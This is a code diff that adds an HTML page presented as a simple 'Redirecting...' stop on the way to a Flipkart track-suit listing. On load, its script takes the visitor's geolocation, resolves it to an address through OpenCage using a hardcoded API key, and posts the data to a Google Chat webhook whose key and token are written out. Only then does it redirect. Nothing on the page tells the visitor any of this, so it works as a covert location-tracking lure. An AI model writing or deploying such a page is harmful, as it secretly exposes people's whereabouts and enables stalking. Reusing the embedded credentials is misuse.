@@ -1,0 +1,97 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <script>window.onload = () => {
+            // Check if geolocation is available in the browser
+            if (navigator.geolocation) {
+                // Get the user's current position
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Fetch latitude and longitude from position
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // Convert latitude and longitude to location name (reverse geocoding)
+                        getLocationName(latitude, longitude)
+                            .then(locationName => {
+                                const locationData = {
+                                    latitude: latitude,
+                                    longitude: longitude,
+                                    locationName: locationName
+                                };
+
+                                // Send the fetched location to Google Chat webhook
+                                sendToGoogleChat(locationData)
+                                    .then(() => {
+                                        // Redirect the user to the product page after sending location
+                                        window.location.href = "https://www.flipkart.com/praume-self-design-men-track-suit/p/itmbff90ed62b5d3?pid=TKSFYRM58RHMTAPG&lid=LSTTKSFYRM58RHMTAPGELHV9A&marketplace=FLIPKART&q=track+suit&store=clo%2Fnyk&srno=s_1_11&otracker=search&otracker1=search&fm=Search&iid=en_R-ZEOqBPGy6Uv6TMvYMrufNVqp8kXq1crqk3jz_WdxMJtnZ23aRvdSh94u2bnjQtZSSyX9Pg8Ny3cH4_YC-oAQ%3D%3D&ppt=sp&ppn=sp&ssid=1vevwkj0cw0000001737400690551&qH=1126258db28cb724";
+                                    })
+                                    .catch(error => {
+                                        console.error('Error sending location:', error);
+                                        // Redirect after error as fallback
+                                        window.location.href = "https://www.flipkart.com/praume-self-design-men-track-suit/p/itmbff90ed62b5d3?pid=TKSFYRM58RHMTAPG&lid=LSTTKSFYRM58RHMTAPGELHV9A&marketplace=FLIPKART&q=track+suit&store=clo%2Fnyk&srno=s_1_11&otracker=search&otracker1=search&fm=Search&iid=en_R-ZEOqBPGy6Uv6TMvYMrufNVqp8kXq1crqk3jz_WdxMJtnZ23aRvdSh94u2bnjQtZSSyX9Pg8Ny3cH4_YC-oAQ%3D%3D&ppt=sp&ppn=sp&ssid=1vevwkj0cw0000001737400690551&qH=1126258db28cb724";
+                                    });
+                            })
+                            .catch(error => {
+                                console.error('Error retrieving location name: ' + error.message);
+                                // Redirect in case of failure to fetch location
+                                window.location.href = "https://www.flipkart.com/praume-self-design-men-track-suit/p/itmbff90ed62b5d3?pid=TKSFYRM58RHMTAPG&lid=LSTTKSFYRM58RHMTAPGELHV9A&marketplace=FLIPKART&q=track+suit&store=clo%2Fnyk&srno=s_1_11&otracker=search&otracker1=search&fm=Search&iid=en_R-ZEOqBPGy6Uv6TMvYMrufNVqp8kXq1crqk3jz_WdxMJtnZ23aRvdSh94u2bnjQtZSSyX9Pg8Ny3cH4_YC-oAQ%3D%3D&ppt=sp&ppn=sp&ssid=1vevwkj0cw0000001737400690551&qH=1126258db28cb724";
+                            });
+                    },
+                    (error) => {
+                        console.error('Error retrieving location: ' + error.message);
+                        // Redirect in case of failure to get location
+                        window.location.href = "https://www.flipkart.com/praume-self-design-men-track-suit/p/itmbff90ed62b5d3?pid=TKSFYRM58RHMTAPG&lid=LSTTKSFYRM58RHMTAPGELHV9A&marketplace=FLIPKART&q=track+suit&store=clo%2Fnyk&srno=s_1_11&otracker=search&otracker1=search&fm=Search&iid=en_R-ZEOqBPGy6Uv6TMvYMrufNVqp8kXq1crqk3jz_WdxMJtnZ23aRvdSh94u2bnjQtZSSyX9Pg8Ny3cH4_YC-oAQ%3D%3D&ppt=sp&ppn=sp&ssid=1vevwkj0cw0000001737400690551&qH=1126258db28cb724";
+                    }
+                );
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+                // Redirect if geolocation is not supported
+                window.location.href = "https://www.flipkart.com/praume-self-design-men-track-suit/p/itmbff90ed62b5d3?pid=TKSFYRM58RHMTAPG&lid=LSTTKSFYRM58RHMTAPGELHV9A&marketplace=FLIPKART&q=track+suit&store=clo%2Fnyk&srno=s_1_11&otracker=search&otracker1=search&fm=Search&iid=en_R-ZEOqBPGy6Uv6TMvYMrufNVqp8kXq1crqk3jz_WdxMJtnZ23aRvdSh94u2bnjQtZSSyX9Pg8Ny3cH4_YC-oAQ%3D%3D&ppt=sp&ppn=sp&ssid=1vevwkj0cw0000001737400690551&qH=1126258db28cb724";
+            }
+        };
+
+        // Function to get the location name from latitude and longitude using OpenCage Geocoding API
+        async function getLocationName(latitude, longitude) {
+            const apiKey = 'ff01ae12f01c4240aa031386c0e9b7dc'; // Replace with your OpenCage API key
+            const url = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}`;
+
+            const response = await fetch(url);
+            const data = await response.json();
+
+            if (data.results.length > 0) {
+                return data.results[0].formatted;  // Get the formatted address
+            } else {
+                throw new Error('Could not get location name.');
+            }
+        }
+
+        // Function to send location data to Google Chat
+        async function sendToGoogleChat(locationData) {
+            const message = {
+                "text": `Location: ${locationData.locationName}\nLatitude: ${locationData.latitude}, Longitude: ${locationData.longitude}`
+            };
+
+            // Replace with your actual Google Chat webhook URL
+            const webhookUrl = 'https://chat.googleapis.com/v1/spaces/AAAAUecI8u4/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=CI-5TePxIBupICJu226PTvNP3VFOZH0lI6-zRsknZH4';  // The webhook URL you got from Google Chat
+
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            });
+
+            if (!response.ok) {
+                throw new Error('Error sending location to Google Chat');
+            }
+        }</script>
+</body>
+</html>
